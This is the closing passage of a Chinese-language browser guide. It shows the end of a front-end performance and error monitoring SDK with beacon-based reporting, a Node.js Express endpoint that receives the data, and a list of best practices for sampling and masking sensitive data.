    history.pushState = function (...args) {
      originalPushState.apply(this, args);
      window.dispatchEvent(new PopStateEvent('popstate'));
    };

    history.replaceState = function (...args) {
      originalReplaceState.apply(this, args);
      window.dispatchEvent(new PopStateEvent('popstate'));
    };

    window.addEventListener('popstate', () => {
      this.trackBehavior({
        type: 'route',
        from: lastHash,
        to: location.pathname + location.search,
        timestamp: Date.now(),
      });
    });
  }

  // ==================== 资源监控 ====================

  /**
   * Step 7：初始化资源监控
   */
  initResourceMonitor() {
    // 使用 PerformanceObserver 监控资源加载
    try {
      const observer = new PerformanceObserver((list) => {
        for (const entry of list.getEntries()) {
          this.monitorResource(entry);
        }
      });
      observer.observe({ type: 'resource', buffered: true });
    } catch (e) {
      // 不支持 PerformanceObserver 时降级
      setTimeout(() => {
        performance.getEntriesByType('resource').forEach(entry => {
          this.monitorResource(entry);
        });
      }, 1000);
    }
  }

  monitorResource(entry) {
    // 只关注慢资源（> 1s）
    if (entry.duration > 1000) {
      this.resources.push({
        name: entry.name,
        duration: Math.round(entry.duration),
        size: entry.transferSize || 0,
        type: entry.initiatorType,
        timestamp: Date.now(),
      });
    }
  }

  // ==================== 上报模块 ====================

  /**
   * Step 8：初始化上报器
   */
  initReporter() {
    this.reportQueue = [];
    this.isReporting = false;
  }

  /**
   * Step 9：上报数据
   * @param {string} type 数据类型
   * @param {Object} data 数据内容
   */
  report(type, data) {
    // 采样判断
    if (Math.random() > this.config.sampleRate) return;

    const payload = {
      appId: this.config.appId,
      sessionId: this.sessionId,
      type,
      data,
      url: location.href,
      ua: navigator.userAgent,
      timestamp: Date.now(),
      screen: {
        width: screen.width,
        height: screen.height,
      },
    };

    // 决定上报方式
    if (type === 'error') {
      // 错误立即上报
      this.send(payload);
    } else {
      // 其他数据加入队列，批量上报
      this.reportQueue.push(payload);
      if (this.reportQueue.length >= 10) {
        this.flush();
      }
    }
  }

  /**
   * Step 10：发送数据到服务端
   */
  send(data) {
    const payload = JSON.stringify(data);

    // 优先使用 sendBeacon（页面卸载时可靠）
    if (navigator.sendBeacon) {
      navigator.sendBeacon(this.config.dsn, payload);
      return;
    }

    // 降级为 Image beacon
    if (this.config.useImageBeacon) {
      const img = new Image();
      img.src = `${this.config.dsn}?data=${encodeURIComponent(payload)}`;
      return;
    }

    // 最后降级为 XHR/Fetch
    fetch(this.config.dsn, {
      method: 'POST',
      body: payload,
      keepalive: true,
      headers: { 'Content-Type': 'application/json' },
    }).catch(() => {
      // 上报失败，存入 localStorage 待下次发送
      this.saveToLocalStorage(data);
    });
  }

  /**
   * Step 11：批量刷新上报
   */
  flush(useBeacon = false) {
    if (this.reportQueue.length === 0) return;

    const batch = [...this.reportQueue];
    this.reportQueue = [];

    if (useBeacon && navigator.sendBeacon) {
      navigator.sendBeacon(
        this.config.dsn,
        JSON.stringify({ type: 'batch', items: batch })
      );
    } else {
      batch.forEach(item => this.send(item));
    }
  }

  saveToLocalStorage(data) {
    try {
      const pending = JSON.parse(localStorage.getItem('__monitor_pending__') || '[]');
      pending.push(data);
      localStorage.setItem('__monitor_pending__', JSON.stringify(pending.slice(-50)));
    } catch (e) {
      // 忽略存储失败
    }
  }

  // ==================== 公共 API ====================

  /**
   * 手动上报自定义事件
   */
  track(event, data = {}) {
    this.report('custom', { event, ...data });
  }

  /**
   * 设置用户标识
   */
  setUserId(userId) {
    this.userId = userId;
  }

  /**
   * 设置额外上下文
   */
  setContext(context) {
    this.context = { ...this.context, ...context };
  }

  /**
   * 获取当前状态（用于调试）
   */
  getStatus() {
    return {
      initialized: this.isInitialized,
      errorsCount: this.errors.length,
      behaviorsCount: this.behaviors.length,
      resourcesCount: this.resources.length,
      metrics: this.metrics,
    };
  }

  /**
   * 销毁实例
   */
  destroy() {
    this.flush(true);
    this.errors = [];
    this.behaviors = [];
    this.resources = [];
    this.metrics = {};
    this.isInitialized = false;
  }
}

// ==================== 使用示例 ====================

// 初始化 SDK
const monitor = new MonitorSDK({
  appId: 'my-app-id',
  dsn: 'https://monitor.example.com/api/collect',
  sampleRate: 1,              // 100% 采样
  maxErrors: 20,
  maxBehaviors: 50,
  autoTrack: true,
});

// 手动埋点
monitor.track('button_click', { button_id: 'submit' });

// 设置用户 ID
monitor.setUserId('user_12345');

// 查看状态
console.log(monitor.getStatus());

// 导出（UMD / ES Module）
if (typeof module !== 'undefined' && module.exports) {
  module.exports = MonitorSDK;
}
```

## B.3 服务端接收示例

```javascript
// Node.js Express 接收端
const express = require('express');
const app = express();

app.use(express.raw({ type: '*/*', limit: '10mb' }));

app.post('/api/collect', (req, res) => {
  try {
    // 解析数据
    const data = JSON.parse(req.body.toString());

    // Step 1：验证必要字段
    if (!data.appId || !data.type) {
      return res.status(400).send('Missing required fields');
    }

    // Step 2：根据类型分发处理
    switch (data.type) {
      case 'performance':
        handlePerformanceData(data);
        break;
      case 'error':
        handleErrorData(data);
        break;
      case 'custom':
        handleCustomEvent(data);
        break;
      case 'batch':
        data.items.forEach(item => processItem(item));
        break;
      default:
        console.warn('Unknown type:', data.type);
    }

    res.status(204).end();
  } catch (e) {
    console.error('Parse error:', e.message);
    res.status(400).send('Invalid JSON');
  }
});

app.listen(3000, () => console.log('Monitor server running on :3000'));
```

## B.4 最佳实践总结

```text
1. 采样策略
   - 生产环境建议 10%-50% 采样
   - 错误数据 100% 采集
   - 行为数据按需采集

2. 上报时机
   - 错误：立即上报
   - 性能：页面加载完成后
   - 行为：批量定时或页面隐藏时
   - 使用 sendBeacon 保证可靠性

3. 数据脱敏
   - 过滤敏感字段（password、token 等）
   - URL 参数脱敏
   - 用户输入脱敏

4. 性能影响
   - SDK 本身 < 5KB gzip
   - 采集逻辑异步执行
   - 不阻塞主线程
   - 使用 requestIdleCallback 优先级降低

5. 可观测性
   - 三大支柱：Metrics / Logs / Traces
   - 与 APM 平台集成（Datadog / Sentry / 自建）
   - 支持告警规则配置
```

---

> **文档结束**
>
> 本指南涵盖浏览器核心知识体系，从架构原理到实战应用。
> 建议结合实际项目练习，通过 DevTools 验证每个概念。
>
> 版本：v1.0 | 更新日期：2026-06
